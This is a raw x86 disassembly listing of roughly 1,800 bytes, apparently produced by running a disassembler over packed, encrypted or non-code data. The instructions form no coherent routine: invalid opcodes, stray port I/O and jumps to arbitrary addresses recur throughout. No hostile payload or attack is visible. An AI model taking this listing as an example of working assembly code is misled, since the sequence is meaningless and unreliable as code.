  41a6c3:	js     0x41a6ce
  41a6c5:	les    esi,FWORD PTR [edx+0x32]
  41a6c8:	cmp    al,0x29
  41a6ca:	and    esi,esi
  41a6cc:	arpl   WORD PTR [edx],bp
  41a6ce:	scas   al,BYTE PTR es:[edi]
  41a6cf:	push   cs
  41a6d0:	jmp    0x2d516d
  41a6d5:	mov    bl,BYTE PTR [ecx+ebp*4-0x11bc41c0]
  41a6dc:	push   esp
  41a6dd:	imul   edx,ebx,0xffffffdb
  41a6e0:	call   0x30221f
  41a6e5:	jge    0x41a6d6
  41a6e7:	sbb    eax,DWORD PTR [esp+ebx*1-0x63fff152]
  41a6ee:	xor    al,0x10
  41a6f0:	pop    eax
  41a6f1:	cdq    
  41a6f2:	fld    DWORD PTR [edx+0x24]
  41a6f5:	add    BYTE PTR [eax],al
  41a6f7:	add    BYTE PTR [eax],al
  41a6f9:	add    BYTE PTR [ecx-0x2d],dl
  41a6fc:	fucomi st,st(0)
  41a6fe:	mov    ebx,0x6dffee7a
  41a703:	out    dx,eax
  41a704:	sbb    eax,DWORD PTR [esp+eax*2-0x39fff152]
  41a70b:	call   DWORD PTR [edx+0x24]
  41a70e:	test   eax,0xe8c8a457
  41a713:	lea    edx,[esi]
  41a715:	rcl    DWORD PTR [ecx],0x57
  41a718:	pop    ss
  41a719:	enter  0x3c20,0x5a
  41a71d:	data16 and BYTE PTR [esi+edx*2],dl
  41a721:	xchg   ax,ax
  41a723:	(bad)  
  41a724:	sub    dh,BYTE PTR [esi+edx*1+0x74]
  41a728:	inc    ecx
  41a729:	out    dx,eax
  41a72a:	push   ecx
  41a72b:	add    dl,BYTE PTR [ecx+ecx*4]
  41a72e:	pop    esi
  41a72f:	fild   QWORD PTR [ebx+eax*2-0xeba798]
  41a736:	ja     0x41a710
  41a738:	push   ecx
  41a739:	or     eax,0x12c314
  41a73e:	nop
  41a73f:	les    esp,FWORD PTR [ebx+eax*2-0x3292ee3b]
  41a746:	push   0x4fffcca6
  41a74b:	loopne 0x41a79e
  41a74d:	or     eax,0x12c70c
  41a752:	nop
  41a753:	or     al,0x52
  41a755:	mov    DWORD PTR [eax],ebp
  41a757:	cmp    bl,ch
  41a759:	inc    eax
  41a75a:	fsubr  st,st(4)
  41a75c:	stos   BYTE PTR es:[edi],al
  41a75d:	mov    BYTE PTR [eax],al
  41a75f:	add    BYTE PTR [eax],al
  41a761:	add    BYTE PTR [eax],al
  41a763:	stos   DWORD PTR es:[edi],eax
  41a764:	xchg   edi,eax
  41a765:	out    0xb4,eax
  41a767:	and    eax,0x7c88edf6
  41a76c:	sub    BYTE PTR [edx+ecx*8-0x2f],ch
  41a770:	jp     0x41a755
  41a772:	mov    dl,dl
  41a774:	mov    dh,0x12
  41a776:	std    
  41a777:	nop
  41a778:	pop    ebx
  41a779:	jmp    0x41a742
  41a77b:	xchg   ecx,ecx
  41a77d:	into   
  41a77e:	mov    ah,0x93
  41a780:	sbb    dh,BYTE PTR [edx]
  41a782:	or     cl,dl
  41a784:	and    eax,0xdac808eb
  41a789:	xor    al,0x0
  41a78b:	xlat   BYTE PTR ds:[ebx]
  41a78c:	pop    ebx
  41a78d:	adc    cl,BYTE PTR [ecx]
  41a78f:	fcmovb st,st(2)
  41a791:	out    0xb4,al
  41a793:	sbb    esi,DWORD PTR [ebp+0x5f7957ce]
  41a799:	aas    
  41a79a:	jae    0x41a72f
  41a79c:	rcl    bl,cl
  41a79e:	dec    ebx
  41a79f:	push   ebp
  41a7a0:	mov    dl,0xdd
  41a7a2:	int3   
  41a7a3:	cmp    dl,bh
  41a7a5:	leave  
  41a7a6:	dec    eax
  41a7a7:	or     edi,ecx
  41a7a9:	sbb    edi,DWORD PTR [eax+ecx*1-0x6fb9741a]
  41a7b0:	push   ecx
  41a7b1:	clc    
  41a7b2:	add    ebx,DWORD PTR [ecx]
  41a7b4:	jl     0x41a7ed
  41a7b6:	and    esp,DWORD PTR [eax+0x52e53a3d]
  41a7bc:	mov    ebp,0x73527d2f
  41a7c1:	add    ah,bh
  41a7c3:	es push ebx
  41a7c5:	loopne 0x41a7ab
  41a7c7:	add    BYTE PTR [eax],al
  41a7c9:	add    BYTE PTR [eax],al
  41a7cb:	add    BYTE PTR [edx-0x43],dl
  41a7ce:	das    
  41a7cf:	stc    
  41a7d0:	sbb    eax,0x57fc8cf5
  41a7d5:	cmp    esp,DWORD PTR [ecx-0xcb3ef4d]
  41a7db:	mov    ?,WORD PTR [eax+0x3d]
  41a7de:	push   esp
  41a7df:	loopne 0x41a7d4
  41a7e1:	mov    bl,0xf7
  41a7e3:	add    ebx,DWORD PTR [ecx]
  41a7e5:	out    0x1b,al
  41a7e7:	in     al,dx
  41a7e8:	pusha  
  41a7e9:	jnp    0x41a81a
  41a7eb:	mov    ebp,0x5a7ac17b
  41a7f0:	sbb    dl,BYTE PTR [ecx-0x23]
  41a7f3:	fwait
  41a7f4:	xchg   ebx,eax
  41a7f5:	mov    dh,0xf7
  41a7f7:	add    edi,DWORD PTR [edx-0x46]
  41a7fa:	das    
  41a7fb:	mov    ah,0xfc
  41a7fd:	xchg   BYTE PTR [edi],cl
  41a7ff:	test   DWORD PTR [edx+esi*4-0x44],ecx
  41a803:	out    dx,al
  41a804:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41a806:	aaa    
  41a807:	add    al,0xf
  41a809:	cmc    
  41a80a:	jmp    0x41a88a
  41a80c:	rol    al,1
  41a80e:	jnp    0x41a853
  41a810:	nop
  41a811:	mov    dl,0xf7
  41a813:	sbb    ch,BYTE PTR [ecx]
  41a815:	dec    ebp
  41a816:	xchg   ebp,eax
  41a817:	or     BYTE PTR [ecx],bl
  41a819:	std    
  41a81a:	retf   
  41a81b:	sbb    esi,DWORD PTR [edi-0x6c17f14e]
  41a821:	cmp    eax,DWORD PTR [ebx-0x3b]
  41a824:	mov    ebx,0xe470d781
  41a829:	lods   al,BYTE PTR ds:[esi]
  41a82a:	test   esi,0xc1ee4f8d
  41a830:	add    BYTE PTR [eax],al
  41a832:	add    BYTE PTR [eax],al
  41a834:	add    bl,dl
  41a836:	lds    ecx,FWORD PTR [ecx]
  41a838:	jmp    0x728a5b6a
  41a83d:	enter  0xbb5a,0x12
  41a841:	xchg   esp,eax
  41a842:	mov    dl,0x92
  41a844:	sub    DWORD PTR [eax+0x34],edi
  41a847:	popf   
  41a848:	jmp    0xa9b85ae0
  41a84d:	add    BYTE PTR [ebx-0x119c6cf2],ch
  41a853:	inc    esp
  41a854:	fs daa 
  41a856:	xchg   esp,eax
  41a857:	jb     0x41a8bb
  41a859:	mov    BYTE PTR [edx-0x1a],bl
  41a85c:	rcl    DWORD PTR [ebx+0xf2992b2],cl
  41a862:	(bad)  
  41a863:	cwde   
  41a864:	lods   eax,DWORD PTR ds:[esi]
  41a865:	push   edi
  41a866:	in     al,dx
  41a867:	sub    cl,cl
  41a869:	pop    ds
  41a86a:	mov    eax,0xb417f92a
  41a86f:	sub    dh,cl
  41a871:	add    dh,dl
  41a873:	mov    ss,WORD PTR [ebp+0x30]
  41a876:	out    dx,eax
  41a877:	push   cs
  41a878:	push   ebp
  41a879:	aaa    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	sub    eax,0x1716eff0
  41a881:	jns    0x41a879
  41a883:	xor    cl,BYTE PTR [ecx+0x16]
  41a886:	adc    DWORD PTR [ebx+0x5],edx
  41a889:	push   cs
  41a88a:	mov    eax,0xa0d3743e
  41a88f:	je     0x41a839
  41a891:	rcl    BYTE PTR [ebx-0x30ec1e86],1
  41a897:	xor    al,BYTE PTR [edi]
  41a899:	add    BYTE PTR [eax],al
  41a89b:	add    BYTE PTR [eax],al
  41a89d:	add    BYTE PTR [edx+eiz*8+0x527500d4],dl
  41a8a4:	ja     0x41a8a7
  41a8a6:	scas   al,BYTE PTR es:[edi]
  41a8a7:	ret    0x2452
  41a8aa:	xchg   ebx,eax
  41a8ab:	scas   al,BYTE PTR es:[edi]
  41a8ac:	scas   al,BYTE PTR es:[edi]
  41a8ad:	add    DWORD PTR [eax-0x6abb674d],edi
  41a8b3:	sbb    ch,BYTE PTR [esi+0x4fcbaae8]
  41a8b9:	inc    ecx
  41a8ba:	push   eax
  41a8bb:	mov    dh,0xe7
  41a8bd:	(bad)  
  41a8be:	fidiv  WORD PTR [ebx]
  41a8c0:	stos   DWORD PTR es:[edi],eax
  41a8c1:	and    al,0x9
  41a8c3:	mov    ch,0xe
  41a8c5:	add    BYTE PTR [ecx+0x3f],ch
  41a8c8:	add    al,0xff
  41a8ca:	cmc    
  41a8cb:	push   edx
  41a8cc:	mov    esi,0xebb37902
  41a8d1:	adc    eax,0x2e465d
  41a8d6:	or     BYTE PTR [edi+0x1f],0xc9
  41a8da:	xchg   ecx,eax
  41a8db:	sub    ch,0x0
  41a8de:	cmp    esp,ecx
  41a8e0:	xlat   BYTE PTR ds:[ebx]
  41a8e1:	call   0x2d65fc
  41a8e6:	ret    0x320a
  41a8e9:	sbb    al,0x91
  41a8eb:	jo     0x41a8da
  41a8ed:	add    BYTE PTR [ecx],bh
  41a8ef:	lods   al,BYTE PTR ds:[esi]
  41a8f0:	add    cl,BYTE PTR [ebx-0x9be551e]
  41a8f6:	ds mov eax,0x1fb20bf7
  41a8fc:	xor    ch,BYTE PTR [eax]
  41a8fe:	jb     0x41a888
  41a900:	idiv   BYTE PTR [edi+0x0]
  41a903:	add    BYTE PTR [eax],al
  41a905:	add    BYTE PTR [eax],al
  41a907:	inc    edi
  41a908:	mov    eax,0x199f5feb
  41a90d:	inc    edi
  41a90e:	and    DWORD PTR ds:0xf90010c3,0xa60002f0
  41a918:	retf   
  41a919:	call   0x4180c9a3
  41a91e:	mov    dl,BYTE PTR [eax+0x44c06e5a]
  41a924:	mov    al,0xa1
  41a926:	xor    bl,ch
  41a928:	scas   al,BYTE PTR es:[edi]
  41a929:	imul   esi,ecx,0x27f7e7c
  41a92f:	sub    bl,BYTE PTR [ebx-0x4c]
  41a932:	call   0x730ac6bf
  41a937:	jge    0x41a91d
  41a939:	fistp  QWORD PTR [edi-0x66]
  41a93c:	xchg   ecx,eax
  41a93d:	xchg   ebp,eax
  41a93e:	adc    cl,BYTE PTR [edx]
  41a940:	pushf  
  41a941:	inc    eax
  41a942:	or     al,BYTE PTR [esi-0x3f156e0f]
  41a948:	pop    ecx
  41a949:	push   eax
  41a94a:	mov    bl,BYTE PTR [eax+0x1b]
  41a94d:	push   0xc182100f
  41a952:	jp     0x41a9ca
  41a954:	fcomp  DWORD PTR [edi]
  41a956:	je     0x41a8eb
  41a958:	fsub   DWORD PTR [ebx]
  41a95a:	dec    DWORD PTR [ecx]
  41a95c:	sub    DWORD PTR [eax-0x3a],0xb5e4835e
  41a963:	arpl   WORD PTR [ebp+0x5c],bp
  41a966:	(bad)  
  41a967:	ins    BYTE PTR es:[edi],dx
  41a968:	pop    ecx
  41a969:	imul   eax,esi,0x0
  41a96f:	add    dh,bl
  41a971:	pop    esp
  41a972:	iret   
  41a973:	into   
  41a974:	fcmovnbe st,st(3)
  41a976:	cld    
  41a977:	pop    esp
  41a978:	push   ebx
  41a979:	xor    ch,dl
  41a97b:	push   edi
  41a97c:	dec    esi
  41a97d:	pop    ebp
  41a97e:	adc    bl,BYTE PTR [ebp+0x53]
  41a981:	xchg   BYTE PTR [ebx+0x132db5e7],bh
  41a987:	add    BYTE PTR [ebx],bl
  41a989:	add    bh,ch
  41a98b:	or     ebx,DWORD PTR [ebx]
  41a98d:	add    eax,0xabff0568
  41a992:	push   cs
  41a993:	adc    eax,0xffffff8e
  41a996:	in     eax,dx
  41a997:	sbb    dh,0x1c
  41a99a:	or     BYTE PTR ds:0x78f9b322,cl
  41a9a0:	enter  0x205a,0xa9
  41a9a4:	(bad)  
  41a9a5:	dec    ebp
  41a9a6:	jno    0x41a9bc
  41a9a8:	adc    eax,DWORD PTR [ebp+0x4]
  41a9ab:	hlt    
  41a9ac:	scas   eax,DWORD PTR es:[edi]
  41a9ad:	fdiv   DWORD PTR [ebx]
  41a9af:	add    edx,DWORD PTR [eax-0x736f47ca]
  41a9b5:	cmp    ebp,ecx
  41a9b7:	js     0x41a996
  41a9b9:	dec    ebp
  41a9ba:	or     bh,ah
  41a9bc:	adc    BYTE PTR [ebp+0x75],cl
  41a9bf:	nop
  41a9c0:	mov    BYTE PTR [edi],dh
  41a9c2:	inc    esi
  41a9c3:	nop
  41a9c4:	mov    WORD PTR [ecx],?
  41a9c6:	ss sbb al,0x71
  41a9c9:	out    0xf6,al
  41a9cb:	add    ebx,DWORD PTR [ecx]
  41a9cd:	mov    ch,0xc1
  41a9cf:	add    cl,BYTE PTR [ecx]
  41a9d1:	jge    0x41aa00
  41a9d3:	hlt    
  41a9d4:	add    BYTE PTR [eax],al
  41a9d6:	add    BYTE PTR [eax],al
  41a9d8:	add    ah,dl
  41a9da:	xor    DWORD PTR [edi],0xf7b651a6
  41a9e0:	lods   eax,DWORD PTR ds:[esi]
  41a9e1:	sbb    BYTE PTR [ebx+0x7b],al
  41a9e4:	push   cs
  41a9e5:	jecxz  0x41a99d
  41a9e7:	leave  
  41a9e8:	inc    ebx
  41a9e9:	mov    dh,0x71
  41a9eb:	test   eax,0xe5c6627e
  41a9f0:	cdq    
  41a9f1:	inc    edi
  41a9f2:	loop   0x41a981
  41a9f4:	fwait
  41a9f5:	fwait
  41a9f6:	xor    eax,0xb2aa03b7
  41a9fb:	jo     0x41aa37
  41a9fd:	cmp    BYTE PTR [edx],dl
  41a9ff:	das    
  41aa00:	add    edx,DWORD PTR [eax-0x7de72fc8]
  41aa06:	in     al,0xb1
  41aa08:	out    0xc,eax
  41aa0a:	repz not eax
  41aa0d:	(bad)  
  41aa0e:	pop    ecx
  41aa0f:	push   edx
  41aa10:	outs   dx,BYTE PTR ds:[esi]
  41aa11:	pop    es
  41aa12:	dec    ebp
  41aa13:	jnp    0x41aa58
  41aa15:	lea    esp,[edi]
  41aa17:	mov    ecx,0xec6d97f
  41aa1c:	loope  0x41aa86
  41aa1e:	mov    ah,0x78
  41aa20:	call   0xfa30268d
  41aa25:	pop    ecx
  41aa26:	jae    0x41aa72
  41aa28:	aas    
  41aa29:	push   ecx
  41aa2a:	in     al,0x99
  41aa2c:	cwde   
  41aa2d:	loopne 0x41aa3b
  41aa2f:	xchg   esp,eax
  41aa30:	xchg   edi,eax
  41aa31:	pop    ss
  41aa32:	xchg   ebx,eax
  41aa33:	inc    ebp
  41aa34:	sbb    DWORD PTR [edi+eiz*8],eax
  41aa37:	jbe    0x41aa16
  41aa39:	xor    al,0x8d
  41aa3b:	push   cs
  41aa3c:	sbb    DWORD PTR [eax],eax
  41aa3e:	add    BYTE PTR [eax],al
  41aa40:	add    BYTE PTR [eax],al
  41aa42:	in     al,0x4d
  41aa44:	add    al,0xd9
  41aa46:	mov    ds:0x8b720e8c,al
  41aa4b:	xor    esi,ebp
  41aa4d:	aam    0x9b
  41aa4f:	cmp    DWORD PTR ds:0xdd3992c3,eax
  41aa55:	dec    esi
  41aa56:	cmp    DWORD PTR [ebx],0x7335a6d6
  41aa5c:	inc    esp
  41aa5d:	jb     0x41a9fe
  41aa5f:	retf   
  41aa60:	cli    
  41aa61:	cmp    DWORD PTR [edx+0x349a0eb2],edx
  41aa67:	fisub  DWORD PTR [edx]
  41aa69:	fisubr DWORD PTR [eax-0x72e521f]
  41aa6f:	out    dx,eax
  41aa70:	push   cs
  41aa71:	mov    esi,0xf76e9f94
  41aa76:	push   ebx
  41aa77:	dec    esp
  41aa78:	xchg   ecx,eax
  41aa79:	sub    eax,0xbc99e747
  41aa7e:	mov    bh,0xa0
  41aa80:	dec    esi
  41aa81:	jmp    0x5cde101a
  41aa86:	and    DWORD PTR [esi-0x12],ecx
  41aa89:	out    0x2c,al
  41aa8b:	cmp    al,0x86
  41aa8d:	jmp    0x5590e425
  41aa92:	aaa    
  41aa93:	call   0x3cdd011
  41aa98:	std    
  41aa99:	add    al,ch
  41aa9b:	scas   eax,DWORD PTR es:[edi]
  41aa9c:	push   cs
  41aa9d:	lea    ebp,[esp+eiz*4-0x14]
  41aaa1:	jmp    DWORD PTR [esi]
  41aaa3:	aas    
  41aaa4:	push   es
  41aaa5:	inc    eax
  41aaa6:	add    BYTE PTR [eax],al
  41aaa8:	add    BYTE PTR [eax],al
  41aaaa:	add    BYTE PTR [eax-0x36951737],dh
  41aab0:	in     al,0xa7
  41aab2:	or     BYTE PTR [edx+0x26530efa],al
  41aab8:	stos   BYTE PTR es:[edi],al
  41aab9:	outs   dx,BYTE PTR ds:[esi]
  41aaba:	push   ss
  41aabb:	jns    0x41aa73
  41aabd:	pop    esp
  41aabf:	(bad)
  41aac2:	xlat   BYTE PTR ds:[ebx]
  41aac3:	jns    0x41aa7a
  41aac5:	dec    ebx
  41aac6:	pop    ebx
  41aac7:	lock jae 0x41ab0e
  41aaca:	mov    ebx,esp
  41aacc:	out    dx,eax
  41aacd:	ja     0x41ab13
  41aacf:	test   eax,0x9c74e43a
  41aad4:	cmp    al,0x5c
  41aad6:	add    al,0xbe
  41aad8:	mov    eax,0xaf39a60a
  41aadd:	not    BYTE PTR [eax-0x2a]
  41aae0:	mov    dh,0xe
  41aae2:	mov    esp,DWORD PTR [edi+0x79ff555e]
  41aae8:	scas   eax,DWORD PTR es:[edi]
  41aae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaea:	inc    esp
  41aaeb:	push   edx
  41aaec:	repz push cs
  41aaee:	call   0x506054
  41aaf3:	loop   0x41aa7e
  41aaf5:	mov    dl,0x12
  41aaf7:	stc    
  41aaf8:	scas   al,BYTE PTR es:[edi]
  41aaf9:	jbe    0x41ab23
  41aafb:	adc    dh,bl
  41aafd:	push   cs
  41aafe:	call   FWORD PTR [edi+0x29068a5e]
  41ab04:	scas   eax,DWORD PTR es:[edi]
  41ab05:	jbe    0x41ab0f
  41ab07:	adc    dh,bl
  41ab09:	push   cs
  41ab0a:	(bad)  
  41ab0b:	jg     0x41aadd
  41ab0d:	iret   
  41ab0e:	xor    eax,DWORD PTR [eax]
  41ab10:	add    BYTE PTR [eax],al
  41ab12:	add    BYTE PTR [eax],al
  41ab14:	jmp    0xa085d856
  41ab19:	not    BYTE PTR [esi-0x39]
  41ab1c:	nop
  41ab1d:	call   0x8012:0x991a4852
  41ab24:	jno    0x41aacf
  41ab26:	push   cs
  41ab27:	xchg   DWORD PTR [ecx+0x190452c2],edx
  41ab2d:	call   0x3e9b:0x6d51871a
  41ab34:	add    dl,0x52
  41ab37:	adc    al,0x9
  41ab39:	call   0x3e9b:0x4551870a
  41ab40:	mov    dl,dl
  41ab42:	push   edx
  41ab43:	and    BYTE PTR [ecx],cl
  41ab45:	call   0x3e9b:0x61518736
  41ab4c:	jl     0x41ab20
  41ab4e:	push   edx
  41ab4f:	xor    BYTE PTR [ecx],bl
  41ab51:	call   0x3e9b:0x95518826
  41ab58:	cmp    al,0xc2
  41ab5a:	push   edx
  41ab5b:	dec    esp
  41ab5c:	sbb    ebx,DWORD PTR [ebx-0x11cb12c]
  41ab62:	inc    edi
  41ab63:	push   ebp
  41ab64:	or     esi,ebx
  41ab66:	adc    BYTE PTR [ebx],dl
  41ab68:	ins    BYTE PTR es:[edi],dx
  41ab69:	outs   dx,BYTE PTR ds:[esi]
  41ab6a:	push   edx
  41ab6b:	add    BYTE PTR [ebx],dl
  41ab6d:	inc    ecx
  41ab6e:	adc    cl,BYTE PTR [ecx-0x76faffa0]
  41ab74:	inc    esi
  41ab75:	or     DWORD PTR gs:[edi+0x0],edi
  41ab79:	add    BYTE PTR [eax],al
  41ab7b:	add    BYTE PTR [eax],al
  41ab7d:	pop    edx
  41ab7e:	ins    BYTE PTR es:[edi],dx
  41ab7f:	add    BYTE PTR [bx+si+0x1928],dl
  41ab84:	xor    dl,BYTE PTR [eax-0x4d]
  41ab87:	data16 (bad) 
  41ab89:	aas    
  41ab8a:	pop    esp
  41ab8b:	popf   
  41ab8c:	int3   
  41ab8d:	sub    al,al
  41ab8f:	adc    al,BYTE PTR [eax]
  41ab91:	nop
  41ab92:	into   
  41ab93:	inc    ebp
  41ab94:	and    al,0x80
  41ab96:	sbb    cl,0xff
  41ab99:	pop    ds
  41ab9a:	mov    bl,0xf7
  41ab9c:	mov    bl,BYTE PTR [edx+ebx*2+0x56]
  41aba0:	or     eax,0xec714a0f
  41aba5:	shr    BYTE PTR [ebp+0x73],0xef
  41aba9:	sub    BYTE PTR [esi-0x52170aa0],0x60
  41abb0:	pop    eax
  41abb1:	mov    ah,0xa2
  41abb3:	push   ecx
  41abb4:	add    eax,DWORD PTR [ecx+0x3d]
  41abb7:	mov    ebp,esp
  41abb9:	mov    ds:0x903f6fd,al
  41abbe:	inc    ebx
  41abbf:	jae    0x41abbb
  41abc1:	inc    edx
  41abc2:	mov    cl,0x70
  41abc4:	iret   
  41abc5:	scas   eax,DWORD PTR es:[edi]
  41abc6:	mov    esi,0x3b90049d
  41abcb:	in     eax,dx
  41abcc:	pop    es
  41abcd:	adc    eax,DWORD PTR [ecx-0x3]
  41abd0:	xchg   DWORD PTR [ecx-0x4d],edi
  41abd3:	test   DWORD PTR [ebx],0x13d3ef1b
  41abd9:	inc    eax
  41abda:	(bad)  
  41abdc:	add    edx,DWORD PTR [eax+0xf4bfa2]
  41abe2:	add    BYTE PTR [eax],al
  41abe4:	add    BYTE PTR [eax],al
  41abe6:	loop   0x41ab9a
  41abe8:	test   DWORD PTR [ebp+edx*2+0x7f4c7b5a],0x12ec6149
  41abf3:	push   edi
  41abf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abf5:	push   ecx
  41abf6:	cli    
  41abf7:	mov    ds:0x9aa30088,al
  41abfc:	js     0x41ac46
  41abfe:	nop
  41abff:	dec    ecx
  41ac00:	jmp    0x41ac7d
  41ac02:	xor    dl,0xf7
  41ac05:	mov    WORD PTR [edi],?
  41ac07:	das    
  41ac08:	push   cs
  41ac09:	js     0x41aba2
  41ac0b:	cmp    eax,0x3aa027b4
  41ac10:	test   BYTE PTR [edx+0x725eaecd],0x98
  41ac17:	cmp    ecx,DWORD PTR [edi]
  41ac19:	xchg   edi,eax
  41ac1a:	xchg   edi,eax
  41ac1b:	pop    ebx
  41ac1c:	adc    DWORD PTR [edx+0x25],esp
  41ac1f:	xor    al,0xe5
  41ac21:	pop    ebp
  41ac22:	outs   dx,BYTE PTR ds:[esi]
  41ac23:	cmp    eax,DWORD PTR [ebp-0x1b]
  41ac26:	sbb    al,0xf7
  41ac28:	push   ss
  41ac29:	sar    esp,0x92
  41ac2c:	push   cs
  41ac2d:	jmp    0xeca4b549
  41ac32:	or     bh,BYTE PTR [esi+0x3b81d216]
  41ac38:	ffree  st(1)
  41ac3a:	aam    0xa7
  41ac3c:	push   cs
  41ac3d:	jmp    0xa739234e
  41ac42:	(bad)  
  41ac43:	dec    eax
  41ac44:	out    dx,al
  41ac45:	jb     0x41aca7
  41ac47:	scas   al,BYTE PTR es:[edi]
  41ac48:	fwait
  41ac49:	sub    eax,0x0
  41ac4e:	add    BYTE PTR [eax-0x5e],bh
  41ac51:	ds dec edi
  41ac53:	xchg   ebx,eax
  41ac54:	mov    dl,0xe
  41ac56:	fstp   DWORD PTR [ecx-0x26]
  41ac59:	loopne 0x41ac6f
  41ac5b:	xchg   esp,eax
  41ac5c:	mov    dl,0xf6
  41ac5e:	mov    eax,0x64ee495b
  41ac63:	rol    esp,cl
  41ac65:	push   es
  41ac66:	jb     0x41acaf
  41ac68:	mov    ?,esi
  41ac6a:	imul   ecx,DWORD PTR [edx+0x1ae164b0],0xe0601aef
  41ac74:	mov    ds:0x7004eef9,al
  41ac79:	div    DWORD PTR [edx]
  41ac7b:	outs   dx,BYTE PTR ds:[esi]
  41ac7c:	dec    eax
  41ac7d:	out    dx,al
  41ac7e:	(bad)  
  41ac7f:	shr    BYTE PTR [esi-0x5d485a65],0x3e
  41ac86:	mov    edi,0xe9443eeb
  41ac8b:	xchg   ebx,eax
  41ac8c:	pop    edx
  41ac8d:	adc    DWORD PTR [ecx+0x199b292],esp
  41ac93:	push   ss
  41ac94:	pop    ebp
  41ac95:	arpl   WORD PTR [eax],ax
  41ac97:	mov    edx,0x2e52fed5
  41ac9c:	jle    0x41acd4
  41ac9e:	xor    ebp,0xffffffb3
  41aca1:	jmp    0x41acb8
  41aca3:	mov    eax,ds:0xa2004e9d
  41aca8:	ds xchg ecx,eax
  41acaa:	mul    BYTE PTR [ebp-0x63]
  41acad:	xchg   edi,eax
  41acae:	inc    esp
  41acaf:	xchg   ebp,eax
  41acb0:	sahf   
  41acb1:	xchg   esi,eax
  41acb2:	push   ds
  41acb3:	add    BYTE PTR [eax],al
  41acb5:	add    BYTE PTR [eax],al
  41acb7:	add    BYTE PTR [eax-0x10],dh
  41acba:	adc    cl,BYTE PTR [ecx+0x5e95b65f]
  41acc0:	std    
  41acc1:	pop    esp
  41acc2:	adc    BYTE PTR [ebx+0x74e43a2a],cl
  41acc8:	mov    dh,0x3b
  41acca:	inc    esp
  41accb:	add    al,0x62
  41accd:	clc    
  41acce:	push   ss
  41accf:	call   0x504125
  41acd4:	xor    eax,0x322a626e
  41acd9:	lock push ss
  41acdb:	test   ecx,ebp
  41acdd:	retf   0x801b
  41ace0:	shl    DWORD PTR [ebx+0x2e7a0761],1
  41ace6:	add    WORD PTR [ecx+0x42400fbf],bp
  41aced:	cmp    eax,0xb378e36d
  41acf2:	push   cs
  41acf3:	and    BYTE PTR [eax-0x46],0x57
  41acf7:	xor    DWORD PTR [edx+0x64754f48],0x36
  41acfe:	arpl   WORD PTR [edx+eax*8],dx
  41ad01:	mov    eax,0xbbd1ce97
  41ad06:	or     eax,0xdc3c6900
  41ad0b:	call   0x505f7e
  41ad10:	jmp    0x909ff8c2
  41ad15:	dec    BYTE PTR [eax+0x57]
  41ad18:	push   ebx
  41ad19:	or     al,0x44
  41ad1b:	mov    DWORD PTR [eax],eax
  41ad1d:	add    BYTE PTR [eax],al
  41ad1f:	add    BYTE PTR [eax],al
  41ad21:	inc    ecx
  41ad22:	sub    BYTE PTR [ecx-0x12316b83],bl
  41ad28:	jae    0x41acc0
  41ad2a:	aam    0x1d
  41ad2c:	call   0x5403a5
  41ad31:	or     eax,DWORD PTR [eax]
  41ad33:	cli    
  41ad34:	sbb    cl,BYTE PTR ds:0x86891259
  41ad3a:	push   ecx
  41ad3b:	and    ecx,ebx
  41ad3d:	or     DWORD PTR [edi-0x7b087cea],edx
  41ad43:	sbb    al,0x89
  41ad45:	fbld   TBYTE PTR [eax-0x23]
  41ad48:	pop    ds
  41ad49:	nop
  41ad4a:	pop    ecx
  41ad4b:	cdq    
  41ad4c:	int3   
  41ad4d:	call   0x9041bcad
  41ad52:	les    ebx,FWORD PTR [ebx+0xc]
  41ad55:	sbb    DWORD PTR [edi+0x1cc8e81a],eax
  41ad5b:	adc    al,BYTE PTR [eax]
  41ad5d:	or     esi,DWORD PTR [edi+0x3d568706]
  41ad63:	fwait
  41ad64:	pop    ebp
  41ad65:	or     dh,0xec
  41ad68:	jae    0x41ad00
  41ad6a:	aam    0xdc
  41ad6c:	out    0xe9,eax
  41ad6e:	js     0x41ad82
  41ad70:	add    BYTE PTR [ebx],cl
  41ad72:	cmp    cl,0xda
  41ad75:	mov    WORD PTR [edx+edx*1+0x5d],ds
  41ad79:	sbb    esi,edi
  41ad7b:	add    eax,0x4398db5e
  41ad80:	mov    DWORD PTR [ecx+0x45bc1],eax
  41ad86:	add    BYTE PTR [eax],al
  41ad88:	add    BYTE PTR [eax],al
  41ad8a:	js     0x41ad0d
  41ad8c:	in     eax,dx
  41ad8d:	jmp    DWORD PTR [edi-0x2f]
  41ad90:	pop    ebx
  41ad91:	or     BYTE PTR [eax-0x67],ch
  41ad94:	in     eax,dx
  41ad95:	call   DWORD PTR [edi-0x4d]
  41ad98:	pusha  
  41ad99:	dec    ebp
  41ad9a:	mov    al,ds:0x4bb8fee4
  41ad9f:	mov    bl,0xf7
  41ada1:	push   ebp
  41ada2:	in     eax,0x39
  41ada4:	push   DWORD PTR [ecx]
  41ada6:	mov    WORD PTR ds:[ebx+ecx*2-0x5a],gs
  41adab:	popf   
  41adac:	mov    BYTE PTR [edx+0x47b53a45],cl
  41adb2:	xchg   ecx,eax
  41adb3:	jns    0x41adc5
  41adb5:	iret   
  41adb6:	adc    al,0x46
  41adb8:	cmc    
  41adb9:	inc    esi
  41adba:	adc    DWORD PTR [edx+0x10],esi
  41adbd:	cmp    DWORD PTR [ebp-0x6],edi
  41adc0:	dec    ecx
  41adc1:	out    dx,eax
  41adc2:	pop    eax
  41adc3:	aaa    
  41adc4:	or     eax,0xf7395544
  41adc9:	pop    ebp
  41adca:	in     eax,dx
  41adcb:	xchg   edx,eax
  41adcc:	jbe    0x41adbe
  41adce:	out    0xae,eax
  41add0:	test   DWORD PTR [ebx],0x8142f09
  41add6:	xchg   ebx,eax
  41add7:	mov    dl,0xf7
  41add9:	push   eax
  41adda:	arpl   sp,bx
  41addc:	and    al,0x31
  41adde:	jmp    0xa9cb2d1c
  41ade3:	sub    DWORD PTR [esi-0x3471d475],0x5ecc878b
  41aded:	nop
  41adee:	add    BYTE PTR [eax],al
  41adf0:	add    BYTE PTR [eax],al
  41adf2:	add    BYTE PTR [ebx-0x56],dh
  41adf5:	test   BYTE PTR [ebx],0x90
  41adf8:	pop    ebx
  41adf9:	arpl   WORD PTR [ebx],ax
  41adfb:	nop
  41adfc:	mov    dl,0x78
  41adfe:	cmp    eax,0xfb79b59c
  41ae03:	xchg   BYTE PTR [ebp-0x8],al
  41ae06:	cmp    ch,BYTE PTR [ebp+0x76f374b5]
  41ae0c:	inc    ebp
  41ae0d:	clc    
